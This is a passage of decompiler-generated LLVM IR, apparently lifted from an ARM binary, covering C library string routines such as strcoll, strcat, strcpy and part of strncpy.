  %v5_12628 = load i32, i32* %r3.global-to-local, align 4
  %v6_12628 = add i32 %v5_12628, 1
  store i32 %v6_12628, i32* %r3.global-to-local, align 4
  %v0_1262c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12638.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1262c.pr, label %dec_label_pc_12634, label %.thread

.thread:                                          ; preds = %bb
  %v2_1262c = add i32 %v0_12638.pr.pre, -1
  store i32 %v2_1262c, i32* @r2, align 4
  %v1_12624 = urem i32 %v6_12628, 4
  %v2_12624 = icmp eq i32 %v1_12624, 0
  store i1 %v2_12624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12624, label %dec_label_pc_12634, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_12628.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_12628.pre to i8
  br label %bb

dec_label_pc_12634:                               ; preds = %.thread, %bb, %dec_label_pc_1261c
  %v0_1264028 = phi i32 [ %v0_12610, %dec_label_pc_1261c ], [ %v6_12628, %bb ], [ %v6_12628, %.thread ]
  %v0_12638.pr = phi i32 [ %v0_12614, %dec_label_pc_1261c ], [ %v0_12638.pr.pre, %bb ], [ %v2_1262c, %.thread ]
  %v0_12634 = load i32, i32* @r1, align 4
  store i32 %v0_12634, i32* %ip.global-to-local, align 4
  %v8_1263810 = icmp eq i32 %v0_12638.pr, 8
  store i1 %v8_1263810, i1* %cpsr_z.global-to-local, align 1
  %v5_1263c11 = icmp slt i32 %v0_12638.pr, 8
  br i1 %v5_1263c11, label %dec_label_pc_12678, label %dec_label_pc_12640.preheader

dec_label_pc_12640.preheader:                     ; preds = %dec_label_pc_12634
  %v1_1264046 = inttoptr i32 %v0_1264028 to i32*
  store i32 %v0_12634, i32* %v1_1264046, align 4
  %v3_1264047 = add i32 %v0_1264028, 4
  %v4_1264048 = inttoptr i32 %v3_1264047 to i32*
  %v5_1264049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1264049, i32* %v4_1264048, align 4
  %v6_1264050 = add i32 %v0_1264028, 8
  store i32 %v6_1264050, i32* %r3.global-to-local, align 4
  %v0_1264451 = load i32, i32* @r2, align 4
  %v1_1264452 = add i32 %v0_1264451, -8
  store i32 %v1_1264452, i32* %r2.global-to-local, align 4
  %v5_1264c53 = icmp slt i32 %v1_1264452, 8
  br i1 %v5_1264c53, label %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12650

dec_label_pc_12650:                               ; preds = %dec_label_pc_12640.preheader, %dec_label_pc_12638.dec_label_pc_12640_crit_edge
  %v6_1264055 = phi i32 [ %v6_12640, %dec_label_pc_12638.dec_label_pc_12640_crit_edge ], [ %v6_1264050, %dec_label_pc_12640.preheader ]
  %v0_1264054 = phi i32 [ %v12_1266c, %dec_label_pc_12638.dec_label_pc_12640_crit_edge ], [ %v0_1264028, %dec_label_pc_12640.preheader ]
  %v1_12650 = inttoptr i32 %v6_1264055 to i32*
  %v2_12650 = load i32, i32* @r1, align 4
  store i32 %v2_12650, i32* %v1_12650, align 4
  %v3_12650 = add i32 %v0_1264054, 12
  %v4_12650 = inttoptr i32 %v3_12650 to i32*
  %v5_12650 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12650, i32* %v4_12650, align 4
  %v6_12650 = add i32 %v0_1264054, 16
  store i32 %v6_12650, i32* %r3.global-to-local, align 4
  %v0_12654 = load i32, i32* %r2.global-to-local, align 4
  %v1_12654 = add i32 %v0_12654, -8
  store i32 %v1_12654, i32* %r2.global-to-local, align 4
  %v5_1265c = icmp slt i32 %v1_12654, 8
  br i1 %v5_1265c, label %dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_12650
  %v1_12660 = inttoptr i32 %v6_12650 to i32*
  %v2_12660 = load i32, i32* @r1, align 4
  store i32 %v2_12660, i32* %v1_12660, align 4
  %v3_12660 = add i32 %v0_1264054, 20
  %v4_12660 = inttoptr i32 %v3_12660 to i32*
  %v5_12660 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12660, i32* %v4_12660, align 4
  %v6_12660 = add i32 %v0_1264054, 24
  store i32 %v6_12660, i32* %r3.global-to-local, align 4
  %v0_12664 = load i32, i32* %r2.global-to-local, align 4
  %v1_12664 = add i32 %v0_12664, -8
  store i32 %v1_12664, i32* %r2.global-to-local, align 4
  %v5_1266c = icmp slt i32 %v1_12664, 8
  br i1 %v5_1266c, label %dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %dec_label_pc_12660
  %v7_1266c = inttoptr i32 %v6_12660 to i32*
  %v8_1266c = load i32, i32* @r1, align 4
  store i32 %v8_1266c, i32* %v7_1266c, align 4
  %v9_1266c = add i32 %v0_1264054, 28
  %v10_1266c = inttoptr i32 %v9_1266c to i32*
  %v11_1266c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1266c, i32* %v10_1266c, align 4
  %v12_1266c = add i32 %v0_1264054, 32
  store i32 %v12_1266c, i32* %r3.global-to-local, align 4
  %v6_12670 = load i32, i32* %r2.global-to-local, align 4
  %v7_12670 = add i32 %v6_12670, -8
  store i32 %v7_12670, i32* %r2.global-to-local, align 4
  %v5_1263c = icmp slt i32 %v7_12670, 8
  br i1 %v5_1263c, label %dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12638.dec_label_pc_12640_crit_edge

dec_label_pc_12638.dec_label_pc_12640_crit_edge:  ; preds = %dec_label_pc_12638
  %v2_12640.pre = load i32, i32* @r1, align 4
  %v1_12640 = inttoptr i32 %v12_1266c to i32*
  store i32 %v2_12640.pre, i32* %v1_12640, align 4
  %v3_12640 = add i32 %v0_1264054, 36
  %v4_12640 = inttoptr i32 %v3_12640 to i32*
  %v5_12640 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12640, i32* %v4_12640, align 4
  %v6_12640 = add i32 %v0_1264054, 40
  store i32 %v6_12640, i32* %r3.global-to-local, align 4
  %v0_12644 = load i32, i32* %r2.global-to-local, align 4
  %v1_12644 = add i32 %v0_12644, -8
  store i32 %v1_12644, i32* %r2.global-to-local, align 4
  %v5_1264c = icmp slt i32 %v1_12644, 8
  br i1 %v5_1264c, label %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge, label %dec_label_pc_12650

dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12638.dec_label_pc_12640_crit_edge, %dec_label_pc_12640.preheader
  %v1_12644.lcssa = phi i32 [ %v1_1264452, %dec_label_pc_12640.preheader ], [ %v1_12644, %dec_label_pc_12638.dec_label_pc_12640_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12638
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12650
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge: ; preds = %dec_label_pc_12660
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12678:                               ; preds = %dec_label_pc_12634, %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge, %dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge, %dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge, %dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge, %entry
  %v0_12680 = phi i32 [ %v0_12614, %entry ], [ %v1_12664, %dec_label_pc_12660.dec_label_pc_12678.loopexit_crit_edge ], [ %v1_12654, %dec_label_pc_12650.dec_label_pc_12678.loopexit_crit_edge ], [ %v7_12670, %dec_label_pc_12638.dec_label_pc_12678.loopexit_crit_edge ], [ %v1_12644.lcssa, %dec_label_pc_12640.dec_label_pc_12678.loopexit_crit_edge ], [ %v0_12638.pr, %dec_label_pc_12634 ]
  %v2_12678 = icmp eq i32 %v0_12680, 0
  store i1 %v2_12678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12678, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_12678
  %v2_1267c = load i32, i32* @r0, align 4
  ret i32 %v2_1267c

bb33:                                             ; preds = %dec_label_pc_12678
  %v1_12680 = sub i32 7, %v0_12680
  store i32 %v1_12680, i32* %r2.global-to-local, align 4
  %v3_12684 = mul i32 %v1_12680, 4
  %v4_12684 = add i32 %v3_12684, ptrtoint (i32* @global_var_1268c.656 to i32)
  call void @__pseudo_branch(i32 %v4_12684)
  %v0_12688 = load i32, i32* @r0, align 4
  %v0_1268c = load i32, i32* @r1, align 4
  %v1_1268c = trunc i32 %v0_1268c to i8
  %v2_1268c = load i32, i32* %r3.global-to-local, align 4
  %v3_1268c = inttoptr i32 %v2_1268c to i8*
  store i8 %v1_1268c, i8* %v3_1268c, align 1
  %v4_1268c = load i32, i32* %r3.global-to-local, align 4
  %v5_1268c = add i32 %v4_1268c, 1
  store i32 %v5_1268c, i32* %r3.global-to-local, align 4
  %v0_12690 = load i32, i32* @r1, align 4
  %v1_12690 = trunc i32 %v0_12690 to i8
  %v3_12690 = inttoptr i32 %v5_1268c to i8*
  store i8 %v1_12690, i8* %v3_12690, align 1
  %v4_12690 = load i32, i32* %r3.global-to-local, align 4
  %v5_12690 = add i32 %v4_12690, 1
  store i32 %v5_12690, i32* %r3.global-to-local, align 4
  %v0_12694 = load i32, i32* @r1, align 4
  %v1_12694 = trunc i32 %v0_12694 to i8
  %v3_12694 = inttoptr i32 %v5_12690 to i8*
  store i8 %v1_12694, i8* %v3_12694, align 1
  %v4_12694 = load i32, i32* %r3.global-to-local, align 4
  %v5_12694 = add i32 %v4_12694, 1
  store i32 %v5_12694, i32* %r3.global-to-local, align 4
  %v0_12698 = load i32, i32* @r1, align 4
  %v1_12698 = trunc i32 %v0_12698 to i8
  %v3_12698 = inttoptr i32 %v5_12694 to i8*
  store i8 %v1_12698, i8* %v3_12698, align 1
  %v4_12698 = load i32, i32* %r3.global-to-local, align 4
  %v5_12698 = add i32 %v4_12698, 1
  store i32 %v5_12698, i32* %r3.global-to-local, align 4
  %v0_1269c = load i32, i32* @r1, align 4
  %v1_1269c = trunc i32 %v0_1269c to i8
  %v3_1269c = inttoptr i32 %v5_12698 to i8*
  store i8 %v1_1269c, i8* %v3_1269c, align 1
  %v4_1269c = load i32, i32* %r3.global-to-local, align 4
  %v5_1269c = add i32 %v4_1269c, 1
  store i32 %v5_1269c, i32* %r3.global-to-local, align 4
  %v0_126a0 = load i32, i32* @r1, align 4
  %v1_126a0 = trunc i32 %v0_126a0 to i8
  %v3_126a0 = inttoptr i32 %v5_1269c to i8*
  store i8 %v1_126a0, i8* %v3_126a0, align 1
  %v4_126a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_126a0 = add i32 %v4_126a0, 1
  store i32 %v5_126a0, i32* %r3.global-to-local, align 4
  %v0_126a4 = load i32, i32* @r1, align 4
  %v1_126a4 = trunc i32 %v0_126a4 to i8
  %v3_126a4 = inttoptr i32 %v5_126a0 to i8*
  store i8 %v1_126a4, i8* %v3_126a4, align 1
  %v4_126a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_126a4 = add i32 %v4_126a4, 1
  store i32 %v5_126a4, i32* %r3.global-to-local, align 4
  ret i32 %v0_12688

; uselistorder directives
  uselistorder i32 %v6_12640, { 1, 0 }
  uselistorder i32 %v12_1266c, { 1, 2, 0 }
  uselistorder i32 %v0_1264054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_12638.pr, { 0, 2, 1 }
  uselistorder i32 %v6_12628, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1261c, { 1, 0 }
  uselistorder i32 %v0_1261c, { 1, 2, 0 }
  uselistorder i32 %v0_12614, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12610, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 5, 1, 2, 8, 7, 0, 9 }
  uselistorder label %dec_label_pc_12678, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12650, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_126b4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_126b4 = phi i32 [ %v0_126b4.pre, %bb ], [ %v5_126b4, %bb3 ]
  %v0_126b0 = phi i32 [ %tmp, %bb ], [ %v5_126b0, %bb3 ]
  %v1_126b0 = inttoptr i32 %v0_126b0 to i8*
  %v2_126b0 = load i8, i8* %v1_126b0, align 1
  %v1_126b4 = inttoptr i32 %v0_126b4 to i8*
  %v2_126b4 = load i8, i8* %v1_126b4, align 1
  %v3_126b4 = zext i8 %v2_126b4 to i32
  %v2_126b8 = icmp eq i8 %v2_126b0, 0
  br i1 %v2_126b8, label %.dec_label_pc_126c4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_126b4 = add i32 %v0_126b4, 1
  %v5_126b0 = add i32 %v0_126b0, 1
  %v3_126b0 = zext i8 %v2_126b0 to i32
  %v10_126bc = icmp eq i8 %v2_126b0, %v2_126b4
  br i1 %v10_126bc, label %entry, label %dec_label_pc_126c4

.dec_label_pc_126c4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %bb3, %.dec_label_pc_126c4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_126c4_crit_edge ], [ %v3_126b0, %bb3 ]
  %v2_126c4.pre-phi = sub nsw i32 %.pn, %v3_126b4
  ret i32 %v2_126c4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_126b0, { 0, 2, 1 }
  uselistorder i32 %v0_126b0, { 1, 0 }
  uselistorder i32 %v0_126b4, { 1, 0 }
  uselistorder label %dec_label_pc_126c4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_12734, %entry
  %v0_12734 = phi i32 [ %v5_12734, %dec_label_pc_12734 ], [ %tmp, %entry ]
  %v1_12734 = inttoptr i32 %v0_12734 to i8*
  %v2_12734 = load i8, i8* %v1_12734, align 1
  %v5_12734 = add i32 %v0_12734, 1
  store i32 %v5_12734, i32* %r2.global-to-local, align 4
  %v2_12738 = icmp eq i8 %v2_12734, 0
  store i1 %v2_12738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12738, label %dec_label_pc_12740, label %dec_label_pc_12734

dec_label_pc_12740:                               ; preds = %dec_label_pc_12734
  %v1_12740 = add i32 %v0_12734, -1
  store i32 %v1_12740, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12744

dec_label_pc_12744:                               ; preds = %dec_label_pc_12744, %dec_label_pc_12740
  %v2_1274c = phi i32 [ %v6_1274c, %dec_label_pc_12744 ], [ %v1_12740, %dec_label_pc_12740 ]
  %v0_12744 = load i32, i32* @r1, align 4
  %v1_12744 = inttoptr i32 %v0_12744 to i8*
  %v2_12744 = load i8, i8* %v1_12744, align 1
  %v5_12744 = add i32 %v0_12744, 1
  store i32 %v5_12744, i32* @r1, align 4
  %v2_12748 = icmp eq i8 %v2_12744, 0
  store i1 %v2_12748, i1* %cpsr_z.global-to-local, align 1
  %v3_1274c = add i32 %v2_1274c, 1
  %v4_1274c = inttoptr i32 %v3_1274c to i8*
  store i8 %v2_12744, i8* %v4_1274c, align 1
  %v5_1274c = load i32, i32* %r2.global-to-local, align 4
  %v6_1274c = add i32 %v5_1274c, 1
  store i32 %v6_1274c, i32* %r2.global-to-local, align 4
  %v0_12750 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12750, label %dec_label_pc_12754, label %dec_label_pc_12744

dec_label_pc_12754:                               ; preds = %dec_label_pc_12744
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_1274c, { 1, 0 }
  uselistorder i32 %v5_12734, { 1, 0 }
  uselistorder i32 %v0_12734, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12758 = sub i32 %arg1, %tmp
  %v1_1275c = add i32 %v2_12758, -1
  store i32 %v1_1275c, i32* %r2.global-to-local, align 4
  %v2_127604 = load i8, i8* %arg2, align 1
  %v5_127606 = add i32 %tmp, 1
  store i32 %v5_127606, i32* %r1.global-to-local, align 4
  %v2_127647 = icmp eq i8 %v2_127604, 0
  store i1 %v2_127647, i1* %cpsr_z.global-to-local, align 1
  %v5_127688 = inttoptr i32 %arg1 to i8*
  store i8 %v2_127604, i8* %v5_127688, align 1
  %v0_1276c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1276c9, label %dec_label_pc_12770, label %dec_label_pc_12760.dec_label_pc_12760_crit_edge

dec_label_pc_12760.dec_label_pc_12760_crit_edge:  ; preds = %entry, %dec_label_pc_12760.dec_label_pc_12760_crit_edge
  %v0_12760.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_12768.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12760 = inttoptr i32 %v0_12760.pre to i8*
  %v2_12760 = load i8, i8* %v1_12760, align 1
  %v5_12760 = add i32 %v0_12760.pre, 1
  store i32 %v5_12760, i32* %r1.global-to-local, align 4
  %v2_12764 = icmp eq i8 %v2_12760, 0
  store i1 %v2_12764, i1* %cpsr_z.global-to-local, align 1
  %v4_12768 = add i32 %v5_12760, %v3_12768.pre
  %v5_12768 = inttoptr i32 %v4_12768 to i8*
  store i8 %v2_12760, i8* %v5_12768, align 1
  %v0_1276c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1276c, label %dec_label_pc_12770, label %dec_label_pc_12760.dec_label_pc_12760_crit_edge

dec_label_pc_12770:                               ; preds = %dec_label_pc_12760.dec_label_pc_12760_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12760.dec_label_pc_12760_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_12774 = icmp eq i32 %arg2, 3
  store i1 %v7_12774, i1* %cpsr_z.global-to-local, align 1
  %v1_1277c = add i32 %arg1, -1
  store i32 %v1_1277c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_127f8, label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %entry
  %v3_12784 = udiv i32 %arg2, 4
  store i32 %v3_12784, i32* @lr, align 4
  %v0_12788.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12788

dec_label_pc_12788:                               ; preds = %dec_label_pc_127d4, %dec_label_pc_12784
  %v2_12790 = phi i32 [ %v6_127c8, %dec_label_pc_127d4 ], [ %v1_1277c, %dec_label_pc_12784 ]
  %v0_12788 = phi i32 [ %v1_127d8, %dec_label_pc_127d4 ], [ %v0_12788.pre, %dec_label_pc_12784 ]
  %v1_12788 = inttoptr i32 %v0_12788 to i8*
  %v2_12788 = load i8, i8* %v1_12788, align 1
  %v3_12788 = zext i8 %v2_12788 to i32
  store i32 %v3_12788, i32* %r3.global-to-local, align 4
  %v2_1278c = icmp eq i8 %v2_12788, 0
  store i1 %v2_1278c, i1* %cpsr_z.global-to-local, align 1
  %v3_12790 = add i32 %v2_12790, 1
  %v4_12790 = inttoptr i32 %v3_12790 to i8*
  store i8 %v2_12788, i8* %v4_12790, align 1
  %v5_12790 = load i32, i32* %ip.global-to-local, align 4
  %v6_12790 = add i32 %v5_12790, 1
  store i32 %v6_12790, i32* %ip.global-to-local, align 4
  %v0_12794 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12794, label %dec_label_pc_127e4, label %dec_label_pc_12798

dec_label_pc_12798:                               ; preds = %dec_label_pc_12788
  %v0_12798 = load i32, i32* @r1, align 4
  %v1_12798 = add i32 %v0_12798, 1
  %v2_12798 = inttoptr i32 %v1_12798 to i8*
  %v3_12798 = load i8, i8* %v2_12798, align 1
  %v4_12798 = zext i8 %v3_12798 to i32
  store i32 %v4_12798, i32* %r3.global-to-local, align 4
  %v2_1279c = icmp eq i8 %v3_12798, 0
  store i1 %v2_1279c, i1* %cpsr_z.global-to-local, align 1
  %v3_127a0 = add i32 %v5_12790, 2
  %v4_127a0 = inttoptr i32 %v3_127a0 to i8*
  store i8 %v3_12798, i8* %v4_127a0, align 1
  %v5_127a0 = load i32, i32* %ip.global-to-local, align 4
  %v6_127a0 = add i32 %v5_127a0, 1
  store i32 %v6_127a0, i32* %ip.global-to-local, align 4
  %v0_127a4 = load i32, i32* @r1, align 4
  %v1_127a4 = add i32 %v0_127a4, 1
  store i32 %v1_127a4, i32* %r1.global-to-local, align 4
  %v0_127a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127a8, label %dec_label_pc_127e4, label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %dec_label_pc_12798
  %v1_127ac = add i32 %v0_127a4, 2
  %v2_127ac = inttoptr i32 %v1_127ac to i8*
  %v3_127ac = load i8, i8* %v2_127ac, align 1
  %v4_127ac = zext i8 %v3_127ac to i32
  store i32 %v4_127ac, i32* %r3.global-to-local, align 4
  %v2_127b0 = icmp eq i8 %v3_127ac, 0
  store i1 %v2_127b0, i1* %cpsr_z.global-to-local, align 1
  %v3_127b4 = add i32 %v5_127a0, 2
  %v4_127b4 = inttoptr i32 %v3_127b4 to i8*
  store i8 %v3_127ac, i8* %v4_127b4, align 1
  %v5_127b4 = load i32, i32* %ip.global-to-local, align 4
  %v6_127b4 = add i32 %v5_127b4, 1
  store i32 %v6_127b4, i32* %ip.global-to-local, align 4
  %v0_127b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_127b8 = add i32 %v0_127b8, 1
  store i32 %v1_127b8, i32* %r1.global-to-local, align 4
  %v0_127bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127bc, label %dec_label_pc_127e4, label %dec_label_pc_127c0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_127ac
  %v1_127c0 = add i32 %v0_127b8, 2
  %v2_127c0 = inttoptr i32 %v1_127c0 to i8*
  %v3_127c0 = load i8, i8* %v2_127c0, align 1
  %v4_127c0 = zext i8 %v3_127c0 to i32
  store i32 %v4_127c0, i32* %r3.global-to-local, align 4
  %v2_127c4 = icmp eq i8 %v3_127c0, 0
  store i1 %v2_127c4, i1* %cpsr_z.global-to-local, align 1
  %v3_127c8 = add i32 %v5_127b4, 2
  %v4_127c8 = inttoptr i32 %v3_127c8 to i8*
  store i8 %v3_127c0, i8* %v4_127c8, align 1
  %v5_127c8 = load i32, i32* %ip.global-to-local, align 4
  %v6_127c8 = add i32 %v5_127c8, 1
  store i32 %v6_127c8, i32* %ip.global-to-local, align 4
  %v0_127cc = load i32, i32* %r1.global-to-local, align 4
  %v1_127cc = add i32 %v0_127cc, 1
  store i32 %v1_127cc, i32* %r1.global-to-local, align 4
  %v0_127d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_127d0, label %dec_label_pc_127e4, label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127c0
  %v0_127d4 = load i32, i32* @lr, align 4
  %v1_127d4 = add i32 %v0_127d4, -1
  store i32 %v1_127d4, i32* @lr, align 4
  %v7_127d4 = icmp eq i32 %v0_127d4, 1
  store i1 %v7_127d4, i1* %cpsr_z.global-to-local, align 1
  %v1_127d8 = add i32 %v0_127cc, 2
  store i32 %v1_127d8, i32* @r1, align 4
  br i1 %v7_127d4, label %dec_label_pc_127f8, label %dec_label_pc_12788

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127c0, %dec_label_pc_127ac, %dec_label_pc_12798, %dec_label_pc_12788
  %v1_127e4 = phi i32 [ %v6_127c8, %dec_label_pc_127c0 ], [ %v6_127b4, %dec_label_pc_127ac ], [ %v6_127a0, %dec_label_pc_12798 ], [ %v6_12790, %dec_label_pc_12788 ]
  %v2_127e41 = sub i32 %arg1, %v1_127e4
  %v2_127e8 = add i32 %v2_127e41, %arg2
  store i32 %v2_127e8, i32* %r3.global-to-local, align 4
  %v1_127ec = add i32 %v2_127e8, -1
  store i32 %v1_127ec, i32* %r2.global-to-local, align 4
  %v7_127ec = icmp eq i32 %v2_127e8, 1
  store i1 %v7_127ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127ec, label %bb, label %dec_label_pc_12818

bb:                                               ; preds = %dec_label_pc_127e4
  ret i32 %arg1

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127d4, %entry
  %v2_128086 = phi i32 [ %v1_1277c, %entry ], [ %v6_127c8, %dec_label_pc_127d4 ]
  %v1_127f8 = urem i32 %arg2, 4
  store i32 %v1_127f8, i32* %r2.global-to-local, align 4
  %v2_127f8 = icmp eq i32 %v1_127f8, 0
  store i1 %v2_127f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_127f8, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_127f8
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_127f8, %._crit_edge
  %v2_12808 = phi i32 [ %v6_12808, %._crit_edge ], [ %v2_128086, %dec_label_pc_127f8 ]
  %v0_12804 = phi i32 [ %v0_12804.pre, %._crit_edge ], [ %v1_127f8, %dec_label_pc_127f8 ]
  %v0_12800 = load i32, i32* @r1, align 4
  %v1_12800 = inttoptr i32 %v0_12800 to i8*
  %v2_12800 = load i8, i8* %v1_12800, align 1
  %v3_12800 = zext i8 %v2_12800 to i32
  store i32 %v3_12800, i32* %r3.global-to-local, align 4
  %v5_12800 = add i32 %v0_12800, 1
  store i32 %v5_12800, i32* @r1, align 4
  %v1_12804 = add i32 %v0_12804, -1
  store i32 %v1_12804, i32* %r2.global-to-local, align 4
  %v7_12804 = icmp eq i32 %v0_12804, 1
  store i1 %v7_12804, i1* %cpsr_z.global-to-local, align 1
  %v3_12808 = add i32 %v2_12808, 1
  %v4_12808 = inttoptr i32 %v3_12808 to i8*
  store i8 %v2_12800, i8* %v4_12808, align 1
  %v5_12808 = load i32, i32* %ip.global-to-local, align 4
  %v6_12808 = add i32 %v5_12808, 1
  store i32 %v6_12808, i32* %ip.global-to-local, align 4
  %v0_1280c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1280c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_12810 = load i32, i32* %r3.global-to-local, align 4
  %v2_12810 = icmp eq i32 %v0_12810, 0
  store i1 %v2_12810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12810, label %dec_label_pc_12818, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_12804.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_12818:                               ; preds = %dec_label_pc_127e4, %bb13, %dec_label_pc_12818
  %v2_12820 = phi i32 [ %v6_12820, %dec_label_pc_12818 ], [ %v1_127e4, %dec_label_pc_127e4 ], [ %v6_12808, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1281c = load i32, i32* %r2.global-to-local, align 4
  %v1_1281c = add i32 %v0_1281c, -1
  store i32 %v1_1281c, i32* %r2.global-to-local, align 4
  %v7_1281c = icmp eq i32 %v0_1281c, 1
  store i1 %v7_1281c, i1* %cpsr_z.global-to-local, align 1
  %v3_12820 = add i32 %v2_12820, 1
  %v4_12820 = inttoptr i32 %v3_12820 to i8*
  store i8 0, i8* %v4_12820, align 1
  %v5_12820 = load i32, i32* %ip.global-to-local, align 4
  %v6_12820 = add i32 %v5_12820, 1
  store i32 %v6_12820, i32* %ip.global-to-local, align 4
  %v0_12824 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12824, label %dec_label_pc_12828, label %dec_label_pc_12818

